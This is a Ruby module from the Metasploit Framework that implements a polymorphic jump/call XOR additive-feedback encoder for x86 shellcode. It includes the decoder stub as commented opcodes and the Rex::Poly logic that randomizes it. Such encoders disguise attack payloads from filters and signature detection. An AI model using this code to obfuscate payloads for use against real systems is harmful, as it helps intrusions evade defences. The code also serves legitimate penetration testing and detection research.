require 'msf/core'

module Msf
module Encoders
module X86

###
#
#	"\xfc"                + # cld
#	"\xbbXORK"            + # mov ebx, key
#	"\xeb\x0c"            + # jmp short 0x14
#	"\x5e"                + # pop esi
#	"\x56"                + # push esi
#	"\x31\x1e"            + # xor [esi], ebx
#	"\xad"                + # lodsd
#	"\x01\xc3"            + # add ebx, eax
#	"\x85\xc0"            + # test eax, eax
#	"\x75\xf7"            + # jnz 0xa
#	"\xc3"                + # ret
#	"\xe8\xef\xff\xff\xff", # call 0x8
#
###
class JmpCallAdditive < Msf::Encoder::XorAdditiveFeedback

	Rank = GreatRanking

	def initialize
		super(
			'Name'             => 'Polymorphic Jump/Call XOR Additive Feedback Encoder',
			'Version'          => '$Revision$',
			'Description'      => 'Polymorphic Jump/Call XOR Additive Feedback',
			'Author'           => 'skape',
			'Arch'             => ARCH_X86,
			'Decoder'          =>
				{
					'KeySize'   => 4,
					'BlockSize' => 4,
				})

		generate_decoder_stub
	end

	#
	# Generates a polymorphic version of the jmp/call/additive stub.
	#
	def decoder_stub(state)
		if (state.decoder_stub == nil)
			block = generate_decoder_stub
			state.decoder_key_offset = block.index('XORK')
			state.decoder_stub = block
		end

		state.decoder_stub
	end

	#
	# Append the termination block.
	#
	def encode_end(state)
		state.encoded += [ state.key ].pack(state.decoder_key_pack)
	end

protected

	#
	# Does the actual stub generation.
	#
	def generate_decoder_stub
		key_reg  = Rex::Poly::LogicalRegister::X86.new('key')
		endb     = Rex::Poly::SymbolicBlock::End.new
		cld      = Rex::Poly::LogicalBlock.new('cld', "\xfc")
		init_key = Rex::Poly::LogicalBlock.new('init_key',
			Proc.new { |b| (0xb8 + b.regnum_of(key_reg)).chr + 'XORK' })
		popeip   = Rex::Poly::LogicalBlock.new('popeip', "\x5e")
		pusheip  = Rex::Poly::LogicalBlock.new('pusheip', "\x56")
		xor      = Rex::Poly::LogicalBlock.new('xor',
			Proc.new { |b| "\x31" + (6 + (8 * b.regnum_of(key_reg))).chr })
		lodsd    = Rex::Poly::LogicalBlock.new('lodsd', "\xad")
		add      = Rex::Poly::LogicalBlock.new('add',
			Proc.new { |b| "\x01" + (0xc0 + b.regnum_of(key_reg)).chr })
		test     = Rex::Poly::LogicalBlock.new('test', "\x85\xc0")
		jnz      = Rex::Poly::LogicalBlock.new('jnz',
			Proc.new { |b| "\x75" + [ (0x100 - (b.offset_of(b) - b.offset_of(xor) + 2)) ].pack('C') })
		fin      = Rex::Poly::LogicalBlock.new('ret', "\xc3")
		jmp      = Rex::Poly::LogicalBlock.new('jmp')
		call     = Rex::Poly::LogicalBlock.new('call',
			Proc.new { |b| "\xe8" + [ (-(b.offset_of(endb) - (b.offset_of(jmp) + 2))) ].pack('V') })
		jmp.add_perm(
			Proc.new { |b| "\xeb" + [ (b.offset_of(fin) + 1 - (b.offset_of(b) + 2)) ].pack('C') })

		# These blocks can be in lots of different places, but should only be
		# used once.
		cld.once = true
		init_key.once = true

		# This can be improved by making it so init_key and cld can occur
		# anywhere prior to pusheip.
		fin.depends_on(jnz)
		jnz.depends_on(test)
		test.depends_on(add)
		add.depends_on(lodsd)
		lodsd.depends_on(xor)
		xor.depends_on(pusheip)
		pusheip.depends_on(popeip, init_key, cld)
		call.depends_on(fin, init_key, cld)
		jmp.next_blocks(call)
		jmp.depends_on(init_key, cld)

		jmp.generate([ 
			Rex::Arch::X86::ESP, 
			Rex::Arch::X86::EAX, 
			Rex::Arch::X86::ESI ])
	end

end

end end end
